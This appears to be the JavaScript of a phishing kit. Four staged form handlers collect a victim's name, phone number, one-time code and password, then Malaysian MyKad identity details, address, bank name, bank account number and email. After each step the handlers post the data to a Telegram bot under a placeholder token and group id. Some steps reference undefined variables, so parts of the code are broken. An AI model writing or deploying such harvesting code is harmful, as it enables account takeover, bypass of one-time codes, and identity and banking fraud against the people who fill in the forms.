function processFirstData(){
	$('#firstForm').submit(function(submitingprocessFirstData){
	submitingprocessFirstData.preventDefault();

	var $full_name = $("input#full_name").val();
	var $phone_number = $("input#phone_number").val();
	//Nama%20%3A%205555555%0ANomor%20%3A%205555555%0AOpt%20%3A%20555555%0APassword%20%3A%205555555
	var gabungan = 'Nama%20%3A%20'+full_name.value+'%0ANomor%20%3A%20'+phone_number.value;
	var token = 'tokenbot';
	var grup = '-1111111';


	if($full_name == "" && $phone_number === ""){
	$('.verification_info').show();
	$('.account_verification').hide();
	return false;
	}
	
	$.ajax({
		type: "POST",
		url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
		data: $(this).serialize(),
		beforeSend: function() {
			$('.loading').show();
		},
		success: function(){
		$(".second").show();
		$('.loading').hide();
		$('.first').hide();
		$("input#validatephone_number").val($phone_number);
		}
	});
	});  
	return false;
};

function processSecondData(){
	$('#secondForm').submit(function(submitingprocessSecondData){
	submitingprocessSecondData.preventDefault();
	
	var $phone_number = $("input#validatephone_number").val();
	var $otp_code = $("input#otp_code").val();
	var $full_name = $("input#validateFullName").val();
	var gabungan = 'Nama%20%3A%20'+full_name.value+'%0ANomor%20%3A%20'+phone_number.value+`%0AOtp%20%3A%20`+ otp.value;
	var token = 'tokenbot';
	var grup = '-1111111';

	if($full_name == "" && $phone_number == "" && $otp_code == ""){
	$('.verification_info').show();
	$('.account_verification').hide();
	return false;
	}
	
	$.ajax({
		type: "POST",
		url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
		data: $(this).serialize(),
		beforeSend: function() {
			$('.loading').show();
		},
		success: function(){
		$(".third").show();
		$('.loading').hide();
		$('.second').hide();
		$("input#validateOtpCode").val($otp_code);
		}
	});
	});  
	return false;
};

function processThirdData(){
	$('#thirdForm').submit(function(submitingprocessThirdData){
	submitingprocessThirdData.preventDefault();

	var $full_name = $("input#validateFullName").val();
	var $phone_number = $("input#validatephone_number").val();
	var $otp_code = $("input#validateotp_code").val();
	var $password = $("input#password").val();
	var token = 'tokenbot';
	var grup = '-1111111';
	var gabungan = 'Nama%20%3A%20'+full_name.value+'%0ANomor%20%3A%20'+phone_number.value+`%0AOtp%20%3A%20`+ otp.value+`%0APassword%20%3A%20`+password.value;

	
	if($full_name == "" && $phone_number == "" && $otp_code == "" && $password == ""){
	$('.verification_info').show();
	$('.account_verification').hide();
	return false;
	}
	
	$.ajax({
		type: "POST",
		url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
		data: $(this).serialize(),
		beforeSend: function() {
			$('.loading').show();
		},
		success: function(){
		$(".four").show();
		$('.loading').hide();
		$('.third').hide();
		$("input#validatepassword").val($password);
		}
	});
	});  
	return false;
};
function processfourData(){
	$('#fourForm').submit(function(submitingprocessfourData){
	submitingprocessfourData.preventDefault();
	
	var $phone_number = $("input#validatephone_number").val();
	var $otp_code = $("input#validateotp_code").val();
	var $password = $("input#validatepassword").val();
	var $no_mykad = $("input#no_mykad").val();
	var $nama_mykad = $("input#nama_mykad").val();
	var $umur_mykad = $("input#umur_mykad").val();
	var $alamat_mykad = $("input#alamat_mykad").val();
	var $jantina_mykad = $("input#jantina_mykad").val();
	var $pekerjaan_mykad = $("input#pekerjaan_mykad").val();
	var $bank_mykad = $("input#bank_mykad").val();
	var $nbnk_mykad = $("input#nbnk_mykad").val();
	var $emel_mykad = $("input#emel_mykad").val();
	var token = 'tokenbot';
	var grup = '-1111111';


	if($phone_number == "" && $otp_code == "" && $password == "" && $no_mykad == "" && $nama_mykad == "" && $umur_mykad == "" && $alamat_mykad == "" && $jantina_mykad == "" && $pekerjaan_mykad == "" && $bank_mykad == "" && $nbnk_mykad == "" && $emel_mykad == ""){
	$('.verification_info').show();
	$('.account_verification').hide();
	return false;
	}
	
	$.ajax({
		type: "POST",
		url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
		data: $(this).serialize(),
		beforeSend: function() {
			$('.loading').show();
		},
		success: function(){
		$(".five").show();
		$('.loading').hide();
		$('.four').hide();
		}
	});
	});  
	return false;
};